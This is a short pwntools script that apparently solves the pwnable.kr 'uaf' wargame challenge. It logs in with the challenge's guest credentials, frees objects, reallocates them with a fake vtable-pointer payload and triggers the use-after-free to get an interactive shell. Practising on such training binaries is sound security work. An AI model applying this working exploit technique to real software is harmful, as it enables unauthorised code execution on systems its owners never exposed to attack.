import pwn
from pwnlib.context import context

context.log_level = 'debug'


def main():
    session = pwn.ssh(host="pwnable.kr", port=2222, user="uaf", password="guest")
    process = session.process(['./uaf', '24', '/dev/stdin'])

    payload = pwn.p64(0x401568) + b'A' * 16  # 0x401568 is the address of (vptr-0x8) because in the assembly of the
    # code, it adds 0x8

    process.recv(1024)

    # --- actual attack starts here ---
    process.sendline(b'3')  # "free" option
    process.recvuntil(b'free\n')
    process.sendline(b'2')  # "after" option
    process.send(payload)
    process.recvuntil(b'free\n')
    process.sendline(b'2')  # "after" option
    process.send(payload)
    process.recvuntil(b'free\n')
    process.sendline(b'1')  # "use" option

    process.interactive()


if __name__ == '__main__':
    main()
